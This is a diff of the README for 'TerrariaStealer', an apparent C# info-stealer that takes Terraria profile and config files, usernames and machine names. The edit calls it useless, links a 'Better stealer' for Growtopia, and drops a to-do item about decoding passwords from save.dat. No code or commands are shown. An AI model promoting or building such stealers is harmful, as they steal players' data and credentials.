@@ -1,5 +1,6 @@
 # TerrariaStealer
-TerrariaStealer that steal input profiles.json, achievements.dat, servers.dat, condig.json and more. Written in C#.
+Useless TerrariaStealer that steal input profiles.json, achievements.dat, servers.dat, condig.json and more. Written in C#.
+# Better stealer: https://github.com/TheC0mpany/GrowtopiaStealer
 ## Features:
 - Steal UserName
 - Steal Machine Name
@@ -38,5 +39,4 @@ And build your solution
 ![TerrariaStealer](https://user-images.githubusercontent.com/65458800/129890224-93878cdb-63e5-4a93-8394-c38a0fbb2775.png)
 
 ## ToDo
-- Decode password from save.dat
-- Delete terraria steal method and make diffrent for only terraria
+- nothing
